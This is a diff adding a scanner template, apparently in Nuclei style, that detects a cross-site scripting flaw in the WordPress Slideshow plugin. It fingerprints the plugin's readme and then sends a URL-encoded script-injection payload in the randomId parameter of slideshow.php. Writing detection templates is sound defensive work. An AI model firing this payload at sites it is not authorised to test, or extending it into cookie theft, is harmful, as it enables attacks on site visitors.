@@ -1,0 +1,41 @@
+id: wp-slideshow-xss
+brief:
+    title: WordPress Slideshow - Cross-Site Scripting
+    by: daffainfo
+    level: high
+    about: WordPress Slideshow plugin contains multiple cross-site scripting vulnerabilities. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected sit...
+    label:
+        - wordpress
+        - xss
+        - wp-plugin
+        - edb
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/readme.txt'
+      signs:
+        - "on": word
+          has:
+            - Slideshow
+            - 'Stable tag:'
+          in: body
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
